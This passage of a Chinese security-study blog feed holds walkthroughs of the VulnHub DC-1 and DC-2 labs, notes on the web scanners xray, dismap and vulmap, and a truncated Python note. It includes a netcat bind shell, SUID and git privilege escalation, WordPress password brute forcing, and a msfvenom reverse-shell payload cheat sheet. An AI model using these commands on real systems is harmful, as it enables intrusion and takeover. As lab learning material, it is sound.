  </entry>
  <entry>
    <title>vulnhub-DC-1</title>
    <url>/2021/11/18/vulnhub-DC-1/</url>
    <content><![CDATA[<p>vulnhub的DC-1靶机</p>
<span id="more"></span>



<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637215364734-2021-11-1814:02:44.png"></p>
<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>用msf找一找这个框架的漏洞</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637216977266-2021-11-1814:29:37.png"></p>
<p>进入交互式shell</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637217050571-2021-11-1814:30:50.png"></p>
<p>得到一个提示</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637217193058-2021-11-1814:33:13.png"></p>
<p>搜一搜这个cms的配置文件</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637217496023-2021-11-1814:38:16.png"></p>
<p>访问这个配置文件</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637217659243-2021-11-1814:40:59.png"></p>
<p>由msf创建出来的是不能直接进行交互的，只是一个shell</p>
<p><strong>创一个交互式命令行</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;`</span><br></pre></td></tr></table></figure>
<h3 id="数据库修改用户密码"><a href="#数据库修改用户密码" class="headerlink" title="数据库修改用户密码"></a>数据库修改用户密码</h3><p>数据库里看了看user,然后准备登录下admin账户，hash过的密码，需要找他的加密函数</p>
<p>找到这个可以生成</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637218563889-2021-11-1814:56:03.png"></p>
<p>生成一下直接去数据库里改密码hash</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637218903312-2021-11-1815:01:43.png"></p>
<p>改完密码后登录，在dashborad里面找到第三个提示</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637219289828-2021-11-1815:08:09.png"></p>
<p>根据提示找一下这个shadow</p>
<p>在/etc下面</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637219397600-2021-11-1815:09:57.png"></p>
<p>但是执行不了，提示权限不够</p>
<p>找到当前系统所有的suid可执行文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null </span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null </span><br><span class="line">find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>然后利用find提权</p>
<p><code>find /root/thefinalflag.txt -exec cat &#123;&#125; \;</code></p>
<p>读取了root家目录下的最后flag文件</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637221110464-2021-11-1815:38:30.png"></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/find /root/thefinalflag.txt -exec netcat -lvp 4444 -e &quot;/bin/sh&quot;  \;</span><br></pre></td></tr></table></figure>



<p>关于反弹shell ,利用上面的原理可以弹一个shell会攻击机</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637221830965-2021-11-1815:50:30.png"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>熟悉了一下相关工具的使用，还有渗透的思路</p>
<p>参考</p>
<p><a href="https://www.bilibili.com/read/cv8951424">https://www.bilibili.com/read/cv8951424</a></p>
<p><a href="https://infosecwriteups.com/vulnhub-writeup-dc-1-37dcf92b456a">https://infosecwriteups.com/vulnhub-writeup-dc-1-37dcf92b456a</a></p>
<p><a href="https://lnng.top/posts/2ea3.html#toc-heading-11">https://lnng.top/posts/2ea3.html#toc-heading-11</a></p>
<hr>
<h4 id="msf的使用方法"><a href="#msf的使用方法" class="headerlink" title="msf的使用方法"></a>msf的使用方法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">进入命令行工具</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 搜索漏洞名称</span></span><br><span class="line">search [组件或者漏洞关键词]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用漏洞</span></span><br><span class="line">use [漏洞路径]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看需要输入的选项</span></span><br><span class="line">options</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">然后设置options列出来的选项</span></span><br><span class="line">set [选项键]　[选项值]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">设置完所有的参数</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h4 id="后门生成的模块msfvenom"><a href="#后门生成的模块msfvenom" class="headerlink" title="后门生成的模块msfvenom"></a>后门生成的模块msfvenom</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">普通生成</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        msfvenom -p 有效载荷 -f 输出格式 -o 输出文件</span><br><span class="line"></span><br><span class="line">        msfvenom -p windows/meterpreter/reverse_tcp -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">编码生成</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 lhost=攻击机IP lport=攻击机端口 -e 编码方式 -i编码次数 -f 输出格式 -o 输出文件</span><br><span class="line"></span><br><span class="line">        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 lport=8888 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfvenom —list archs #查看支持的系统架构</span><br><span class="line"></span><br><span class="line">        aarch64, armbe, armle, cbea, cbea64, cmd, dalvik, firefox, java, mips, mips64, mips64le, mipsbe, mipsle, nodejs, php, ppc, ppc64, ppc64le, ppce500v2, python, r, ruby, sparc, sparc64, tty, x64, x86, x86_64, zarch</span><br><span class="line"></span><br><span class="line">msfvenom —list platforms #查看支持系统平台</span><br><span class="line"></span><br><span class="line">        aix, android, apple_ios, bsd, bsdi, cisco, firefox, freebsd, hardware, hpux, irix, java, javascript, juniper, linux, mainframe, multi, netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unifi, unix, unknown, windows</span><br><span class="line"></span><br><span class="line">msfvenom -l payload #列出所有可用的payload</span><br><span class="line"></span><br><span class="line">msfvenom -l formats #列出所有的输出格式</span><br><span class="line"></span><br><span class="line">msfvenom -l encrypt #列出所有的加密方式</span><br><span class="line"></span><br><span class="line">msfvenom -l encoders #列出所有的编码器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">常见生成格式</span><br><span class="line"></span><br><span class="line">1、 Windows</span><br><span class="line"></span><br><span class="line">        msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">2、Linux</span><br><span class="line"></span><br><span class="line">        msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp -f elf -o payload.elf</span><br><span class="line"></span><br><span class="line">3、Mac</span><br><span class="line"></span><br><span class="line">        msfvenom --platform osx -a x86 -p osx/x86/shell_reverse_tcp -f macho -o payload.macho</span><br><span class="line"></span><br><span class="line">4、Android</span><br><span class="line"></span><br><span class="line">        msfvenom -p android/meterpreter/reverse_tcp -o payload.apk</span><br><span class="line"></span><br><span class="line">5、Aspx</span><br><span class="line"></span><br><span class="line">        msfvenom --platform windows-p windows/meterpreter/reverse_tcp -f aspx -o payload.aspx</span><br><span class="line"></span><br><span class="line">6、JSP</span><br><span class="line"></span><br><span class="line">        msfvenom --platform java -p java/jsp_shell_reverse_tcp -f raw -o payload.jsp</span><br><span class="line"></span><br><span class="line">7、PHP</span><br><span class="line"></span><br><span class="line">        msfvenom -p php/meterpreter_reverse_tcp -f raw -o payload.php</span><br><span class="line"></span><br><span class="line">8、BASH</span><br><span class="line"></span><br><span class="line">        msfvenom -p cmd/unix/reverse_bash -f raw -o shell.sh</span><br><span class="line"></span><br><span class="line">9、Python</span><br><span class="line"></span><br><span class="line">        msfvenom -p python/meterpreter/reverse_tcp -f raw -o shell.py</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-DC-2</title>
    <url>/2021/11/23/vulnhub-DC-2/</url>
    <content><![CDATA[<p>接着打靶场熟悉工具和渗透思路</p>
<span id="more"></span>

<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>nmap先上来扫一扫内网网段</p>
<p><code>nmap -A 192.168.100.0/24</code></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637631730174-2021-11-2309:42:10.png"></p>
<p>这个104就是dc-2靶机</p>
<h2 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h2><p>没看出来这个7744是个啥服务</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637631843445-2021-11-2309:44:03.png"></p>
<p>查了一下</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637632158790-2021-11-2309:49:18.png"></p>
<p>好像就是一个用来监控协议传输单元质量的?</p>
<p>不管它，先访问一下这个80</p>
<p>在主机探测的时候，看到了重定向，会定向到dc2这个域名</p>
<p>那就改一下本机hosts</p>
<p>/etc/hosts</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.100.104 dc-2</span><br></pre></td></tr></table></figure>

<p>访问一下，打开网页，看到了一个flag的tab</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637632445535-2021-11-2309:54:05.png"></p>
<p>说是要爆破，尝试密码，可能有多个帐号爆出来，有的帐号还没有下一个flag</p>
<h2 id="爆破入后台"><a href="#爆破入后台" class="headerlink" title="爆破入后台"></a>爆破入后台</h2><p>然后这里我懵了，看了其他师傅的博客才知道有个工具叫cewl</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">安装cewl</span></span><br><span class="line"><span class="meta">#</span><span class="bash">他是用来根据网站的信息生成字典的</span></span><br><span class="line">sudo apt install cewl</span><br><span class="line"><span class="meta">#</span><span class="bash">安装wpscan和依赖</span></span><br><span class="line"><span class="meta">#</span><span class="bash">专门打wordpress的软件</span></span><br><span class="line">sudo apt install curl git libcurl4-openssl-dev make zlib1g-dev gawk g++ gcc libreadline6-dev libssl-dev libyaml-dev libsqlite3-dev sqlite3 autoconf libgdbm-dev libncurses5-dev automake libtool bison pkg-config ruby ruby-bundler ruby-dev</span><br><span class="line"></span><br><span class="line">sudo gem install wpscan</span><br></pre></td></tr></table></figure>

<p>题外话，这个时候就是kali方便了..工具自带</p>
<p>这是什么玄学问题???</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637633964518-2021-11-2310:19:24.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637634000037-2021-11-2310:20:00.png"></p>
<p>还有我的cewl生成的字典也是空的…可能是环境的玄学问题..</p>
<p>?不知道咋回事</p>
<p>记录一下WPScan的使用参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–url 扫描网站</span><br><span class="line">-e 枚举</span><br><span class="line">u 枚举用户名，默认从1-10</span><br><span class="line">p 枚举插件</span><br><span class="line">t 枚举主题信息</span><br></pre></td></tr></table></figure>

<p>枚举用户名</p>
<p><code>wpscan --url http://dc-2 --enumerate u</code></p>
<p>爆破密码（将cewl爆出来的dict.txt密码和上一个枚举的用户名放入user.txt中）</p>
<p><code>wpscan --url http://dc-2/ -U users.txt -P dict.txt</code></p>
<blockquote>
<p>我这里是没成功爆出来，因为wpscan扫不出来</p>
<p>cewl也是</p>
</blockquote>
<p>jerry adipiscing提示了找别的入口</p>
<p>tom parturient使用7744登录ssh</p>
<h2 id="拿到shell"><a href="#拿到shell" class="headerlink" title="拿到shell"></a>拿到shell</h2><p>cat,more不能用，</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637635128021-2021-11-2310:38:48.png"></p>
<p>用vi在家目录下找到了这个flag3.txt</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637635000991-2021-11-2310:36:40.png"></p>
<p>可怜的汤姆一直落后与杰瑞可能需要su来解决这个问题</p>
<blockquote>
<p>汤姆杰瑞…我才发现这是猫和老鼠(不是</p>
</blockquote>
<h2 id="vi提权-切用户"><a href="#vi提权-切用户" class="headerlink" title="vi提权(切用户)"></a>vi提权(切用户)</h2><p>vi进入vi编辑界面你</p>
<p><code>:set shell=/bin/sh</code></p>
<p><code>:shell</code></p>
<p>进入shell之后修改环境变量输出</p>
<p><code>export PATH=&quot;/usr/sbin:/usr/bin:/rbin:/bin&quot;</code></p>
<p>然后切换用户jerry</p>
<p><code>su jerry</code>输入刚才jerry的密码</p>
<p><code>find / -name flag4.txt</code>找到flag位置</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637635816845-2021-11-2310:50:16.png"></p>
<h2 id="git提权-root"><a href="#git提权-root" class="headerlink" title="git提权(root)"></a>git提权(root)</h2><p>提示git提权</p>
<p>输入<code>sudo git help config</code></p>
<p>在打开的手册界面<code>!/bin/bash</code></p>
<p>前提是执行sudo -l 提示不需要密码可以使用git命令</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637635968105-2021-11-2310:52:48.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637635913056-2021-11-2310:51:53.png"></p>
<p>找找最后的flag</p>
<p><code>find / -name *flag*</code></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637636300268-2021-11-2310:58:20.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://lnng.top/posts/2ea3.html#toc-heading-16">https://lnng.top/posts/2ea3.html#toc-heading-16</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Web扫描器工具整理</title>
    <url>/2021/11/11/web%E6%89%AB%E6%8F%8F%E5%99%A8%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>继续整理最近新接触的工具，Web扫描器专场,xray和vulmap一直没系统整理过</p>
<span id="more"></span>

<h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a><a href="https://github.com/chaitin/xray">xray</a></h2><p>三种模式</p>
<p>直接扫单个站</p>
<p><code>./xray webscan --url xxx.com</code></p>
<h3 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h3><p><code>./xray webscan --url xxx.com --listen 127.0.0.1:7777</code></p>
<ul>
<li>配置目标站点</li>
</ul>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636609521088-2021-11-1113:45:21.png"></p>
<p><strong>值得注意的是官方提供的例子中这个awvs的靶场似乎已经被墙，所以需要在<code>config.yml</code>配置中添加<code>proxy</code>,配置其上游代理然后就能正常访问</strong></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636609356730-2021-11-1113:42:36.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636608914853-2021-11-1113:35:14.png"></p>
<h4 id="结合bp使用"><a href="#结合bp使用" class="headerlink" title="结合bp使用"></a>结合bp使用</h4><blockquote>
<p>因为更多的使用场景在于一边浏览浏览器xray一边分析，所以结合bp来进行很有必要</p>
</blockquote>
<p>启动命令代理模式一样，需要在bp里面加一个上游代理</p>
<p><strong>bp中上游代理和socks代理不能混用</strong></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636609172503-2021-11-1113:39:32.png"></p>
<p>所以用上了bp之后加上之前xray的上游代理形成了一条代理链</p>
<p><code>socks5://127.0.0.1:1080(我的v2ray代理)</code>&gt;<code>http://127.0.0.1:7777(我的xray代理)</code>&gt;<code>http://127.0.0.1:10086(我的bp代理)</code></p>
<p>不需要xray本身代理的时候可以把第一条去掉，而配置文件中还有对请求本身的代理配置，不在赘述，需要用时翻文档就行</p>
<h3 id="爬虫模式"><a href="#爬虫模式" class="headerlink" title="爬虫模式"></a>爬虫模式</h3><p>并且输出html格式的报告</p>
<ul>
<li>xray不能处理js渲染</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./xray_linux_amd64 webscan --basic-crawler http://testphp.vulnweb.com/ --html-output xray-crawler-testphp.html</span><br></pre></td></tr></table></figure>

<p><strong>如果需要登录网站需要手动设置cookie,在配置文件<code>http</code>的<code>Hearders</code>中</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">http：</span></span><br><span class="line">	<span class="string">headers：</span></span><br><span class="line">		<span class="string">Cookie：key=value</span></span><br></pre></td></tr></table></figure>



<h3 id="服务扫描模式"><a href="#服务扫描模式" class="headerlink" title="服务扫描模式"></a>服务扫描模式</h3><p>支持两种方式</p>
<ol>
<li><p>快速检测单个目标<br>   <code>./xray servicescan --target 127.0.0.1:8009</code></p>
</li>
<li><p>批量检查的 1.file 中的目标, 一行一个目标，带端口<br>   <code>./xray servicescan --target-file 1.file</code> </p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出的文件格式</span><br><span class="line">--html-output [FILE]</span><br><span class="line">--json-output [FILE]</span><br></pre></td></tr></table></figure>

<p><a href="https://docs.xray.cool/#/README">xray官方文档</a></p>
<h2 id="dismap"><a href="#dismap" class="headerlink" title="dismap"></a><a href="https://github.com/zhzyker/dismap/tree/v0.2">dismap</a></h2><p>这个和下面这个都是<a href="https://github.com/zhzyker">之乎者也</a>大佬写的，dismap侧重于资产搜集，比较新的一个工具，但是和vulmap可以联动使用</p>
<p>主页给了一些简单地参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-file string</span><br><span class="line">    Select a URL file for batch identification</span><br><span class="line">    # 从文件中读取 Url 进行批量识别</span><br><span class="line">-ip string</span><br><span class="line">    Network segment [e.g. -ip 192.168.1.0/24 or -ip 192.168.1.1-10]</span><br><span class="line">    # 指定一个网段,格式示例: 192.168.1.1/24  192.168.1.1-100  192.168.1.1-192.168.1.254</span><br><span class="line">-np</span><br><span class="line">    Not use ICMP/PING to detect surviving hosts</span><br><span class="line">    # 不进行主机存活检测,跳过存活检测直接识别 Url</span><br><span class="line">-output string</span><br><span class="line">    Save the scan results to the specified file (default &quot;output.txt&quot;)</span><br><span class="line">    # 自定义识别结果输出文件,默认追加到 output.txt 中,此选项中输出的文件可以直接通过vulmap -f参数来扫描</span><br><span class="line">-port string</span><br><span class="line">    Custom scan ports [e.g. -port 80,443 or -port 1-65535]</span><br><span class="line">    # 自定义需要扫描的 Web 端口,默认端口在 /config/config.go 中</span><br><span class="line">-thread int</span><br><span class="line">    Number of concurrent threads, (adapted to two network segments 2x254) (default 508)</span><br><span class="line">    # 多线程数量,默认508(两个C段的数量),线程越高存活和识别丢失率可能越高,不建议超过2000</span><br><span class="line">-timeout int</span><br><span class="line">    Response timeout time, the default is 5 seconds (default 5)</span><br><span class="line">    # 主机存活探测和 Http 超时时间,默认均为5秒</span><br><span class="line">-url string</span><br><span class="line">    Specify a target URL [e.g. -url https://example.com]</span><br><span class="line">    # 识别单个 Url 时用该选项指定</span><br></pre></td></tr></table></figure>

<p>然后通过规则库可以自定义识别的指纹，批量验证，规则库很好上手，也在md写全了</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636610888790-2021-11-1114:08:08.png"></p>
<h2 id="vulmap"><a href="#vulmap" class="headerlink" title="vulmap"></a><a href="https://github.com/zhzyker/vulmap">vulmap</a></h2><p>这个主要是漏洞扫描和验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可选参数:</span><br><span class="line">  -h, --help            显示此帮助消息并退出</span><br><span class="line">  -u URL, --url URL     目标 URL (e.g. -u &quot;http://example.com&quot;)</span><br><span class="line">  -f FILE, --file FILE  选择一个目标列表文件,每个url必须用行来区分 (e.g. -f &quot;/home/user/list.txt&quot;)</span><br><span class="line">  --fofa keyword        使用 fofa api 批量扫描 (e.g. --fofa &quot;app=Apache-Shiro&quot;)</span><br><span class="line">  --shodan keyword      使用 shodan api 批量扫描 (e.g. --shodan &quot;Shiro&quot;)</span><br><span class="line">  -m MODE, --mode MODE  模式支持&quot;poc&quot;和&quot;exp&quot;,可以省略此选项,默认进入&quot;poc&quot;模式</span><br><span class="line">  -a APP [APP ...]      指定 webapps（e.g. &quot;weblogic&quot;）不指定则自动指纹识别</span><br><span class="line">  -c CMD, --cmd CMD     自定义远程命令执行执行的命令,默认是echo随机md5</span><br><span class="line">  -v VULN, --vuln VULN  利用漏洞,需要指定漏洞编号 (e.g. -v &quot;CVE-2019-2729&quot;)</span><br><span class="line">  -t NUM, --thread NUM  扫描线程数量,默认10线程</span><br><span class="line">  --dnslog server       dnslog 服务器 (hyuga,dnslog,ceye) 默认自动轮询</span><br><span class="line">  --output-text file    扫描结果输出到 txt 文件 (e.g. &quot;result.txt&quot;)</span><br><span class="line">  --output-json file    扫描结果输出到 json 文件 (e.g. &quot;result.json&quot;)</span><br><span class="line">  --proxy-socks SOCKS   使用 socks 代理 (e.g. --proxy-socks 127.0.0.1:1080)</span><br><span class="line">  --proxy-http HTTP     使用 http 代理 (e.g. --proxy-http 127.0.0.1:8080)</span><br><span class="line">  --user-agent UA       允许自定义 User-Agent</span><br><span class="line">  --fofa-size SIZE      fofa api 调用资产数量，默认100，可用(1-10000)</span><br><span class="line">  --delay DELAY         延时时间,每隔多久发送一次,默认 0s</span><br><span class="line">  --timeout TIMEOUT     超时时间,默认 5s</span><br><span class="line">  --list                显示支持的漏洞列表</span><br><span class="line">  --debug               exp 模式显示 request 和 responses, poc 模式显示扫描漏洞列表</span><br><span class="line">  --check               目标存活检测 (on and off), 默认是 on</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参数和例子都给的很全，记录一下做一个备忘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 测试所有漏洞 poc 不指定 -a all 将默认开启指纹识别</span><br><span class="line">python3 vulmap.py -u http://example.com</span><br><span class="line"></span><br><span class="line"># 检查站点是否存在 struts2 漏洞</span><br><span class="line">python3 vulmap.py -u http://example.com -a struts2</span><br><span class="line"></span><br><span class="line"># 对 http://example.com:7001 进行 WebLogic 的 CVE-2019-2729 漏洞利用</span><br><span class="line">python3 vulmap.py -u http://example.com:7001 -v CVE-2019-2729</span><br><span class="line">python3 vulmap.py -u http://example.com:7001 -m exp -v CVE-2019-2729</span><br><span class="line"></span><br><span class="line"># 批量扫描 list.txt 中的 url</span><br><span class="line">python3 vulmap.py -f list.txt</span><br><span class="line"></span><br><span class="line"># 扫描结果导出到 result.json</span><br><span class="line">python3 vulmap.py -u http://example.com:7001 --output-json result.json</span><br><span class="line"></span><br><span class="line"># 调用 fofa api 批量扫描</span><br><span class="line">python3 vulmap.py --fofa app=Apache-Shiro</span><br></pre></td></tr></table></figure>

<p>贴个运行截图</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636610739920-2021-11-1114:05:39.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>扫描器</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Python语法笔记</title>
    <url>/2021/11/06/python/</url>
    <content><![CDATA[<h1 id="python语法笔记"><a href="#python语法笔记" class="headerlink" title="python语法笔记"></a>python语法笔记</h1><span id="more"></span>

<hr>
<ul>
<li>文档中<code>outs：</code>为终端输出的内容</li>
</ul>
<h2 id="py基本元素（变量，数字，字符串）"><a href="#py基本元素（变量，数字，字符串）" class="headerlink" title="py基本元素（变量，数字，字符串）"></a>py基本元素（变量，数字，字符串）</h2><p>python的内建数据类型包括布尔，整形，浮点及字符串</p>
<h3 id="变量（variable）"><a href="#变量（variable）" class="headerlink" title="变量（variable）"></a>变量（variable）</h3><p>py的变量本质上是一个c语言的结构体（struct），就像在一个盒子中预先分配好了布尔类型的空间，整形的空间，浮点的空间，字符串的空间。因此py的变量本身可以看成是一个对象（object）的实现，<strong>所以使用时不需要实现定义变量类型</strong> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#因为以上特性，以下的操作时合法的</span></span><br><span class="line">a = <span class="number">7</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = <span class="string">&quot;abc&quot;</span>  <span class="comment">#值得注意的时py中表示字符串既可以用‘也可以“</span></span><br><span class="line"><span class="built_in">print</span>(a)   </span><br><span class="line">a = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment">#out: 7</span></span><br><span class="line"><span class="comment">#out: abc</span></span><br><span class="line"><span class="comment">#out: abc</span></span><br></pre></td></tr></table></figure>

<p>关于变量名，同样由大、小写字母，下划线，数组组成，且数字不能在变量名中作为首个字符。另外，py的保留字符也不可作为变量名出现，如下图：</p>
<p>![reserved keyword](C:\Users\83487\Pictures\programmer path\reserved keyword.jpg)</p>
<p>str-byte</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bytes</span>(string,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">string.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>byte-str</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="字符串（string）"><a href="#字符串（string）" class="headerlink" title="字符串（string）"></a>字符串（string）</h3><ul>
<li>用方法对字符串进行操作（usage：<code>变量名.方法名（）</code>）</li>
</ul>
<ol>
<li><p><strong>获取长度</strong>可以使用<code>len()</code></p>
</li>
<li><p><strong>提取字符串</strong>使用<code>[]</code>(这并不是一个方法)(允许负值)</p>
</li>
<li><p><strong>拼接</strong> 字符串可以直接用<code>+</code></p>
</li>
<li><p><strong>复制</strong>字符串可以使用<code>*</code></p>
</li>
<li><p><strong>分片</strong> （silce）usage：<code>[start:stop:step]</code>  3s法(</p>
</li>
<li><p><strong>删除</strong> 字符串末尾的空白可以用方法<code>rstrip()</code></p>
<p>  删开头的空白<code>lstrip()</code></p>
<p>  删两头的空白<code>strip()</code></p>
</li>
<li><p><strong>转义</strong> 使用反斜杠  \ ，可以用<code>\t</code>或者<code>\n</code>   </p>
</li>
<li><p><strong>分割</strong> 字符串<code>spilt()</code>，返回一个列表（之后会介绍）</p>
</li>
<li><p><strong>合并</strong>字符串可以使用<code>join()</code>,本质是将列表还原成字符串</p>
</li>
<li><p><strong>字符串中单词首字母大写</strong> 使用<code>title()</code>，同样的，<code>.upper()</code>&amp;<code>.lower()</code>是变成整个字符串大写和小写</p>
</li>
<li><p><strong>字符串转数字</strong> 使用eval函数，只接收字符串，如果输入123py会解释是一个123的数字</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#一个简单的字符串例子</span></span><br><span class="line">id_info = <span class="string">&quot;my name is Atuoa&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(id_info)) <span class="comment">#len</span></span><br><span class="line"><span class="comment">#outs：16</span></span><br><span class="line"></span><br><span class="line">new_idinfo = id_info.replace(<span class="string">&#x27;Atuoa&#x27;</span>,<span class="string">&quot;harry&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(new_idinfo)  <span class="comment">#replace，也可以使用正则表达式匹配</span></span><br><span class="line"><span class="comment">#outs：my name is harry</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(id_info[<span class="number">11</span>:<span class="number">16</span>]) <span class="comment">#slice</span></span><br><span class="line"><span class="comment">#outs：Atuoa    #这里注意一下，第一个字符下标为0，实际取值范围[11,16)</span></span><br><span class="line">				<span class="comment">#如果id_info[0]则是&#x27;m&#x27;单个字符</span></span><br><span class="line">    			<span class="comment">#如果是id_info[-1]则是&#x27;a&#x27;单个字符</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(id_info * <span class="number">3</span> )<span class="comment">#copy</span></span><br><span class="line"><span class="comment">#outs：my name is Atuoamy name is Atuoamy name is Atuoa</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(id_info.split())<span class="comment">#默认按照空格、制表符、换行符分裂</span></span><br><span class="line"><span class="built_in">print</span>(id_info.split(<span class="string">&#x27;i&#x27;</span>)) <span class="comment">#含参数即基于参数分裂字符串</span></span><br><span class="line"><span class="comment">#outs： [&#x27;my&#x27;, &#x27;name&#x27;, &#x27;is&#x27;, &#x27;Atuoa&#x27;]</span></span><br><span class="line"><span class="comment">#outs：[&#x27;my name &#x27;, &#x27;s Atuoa&#x27;]   #list列表形式，这里暂且不讨论</span></span><br><span class="line"></span><br><span class="line">add_info = <span class="string">&quot;,whats your name?&quot;</span></span><br><span class="line">greet_you = id_info + <span class="string">&#x27;\t&#x27;</span> +add_info  <span class="comment">#转义与+</span></span><br><span class="line"><span class="built_in">print</span>(greet_you)</span><br><span class="line"><span 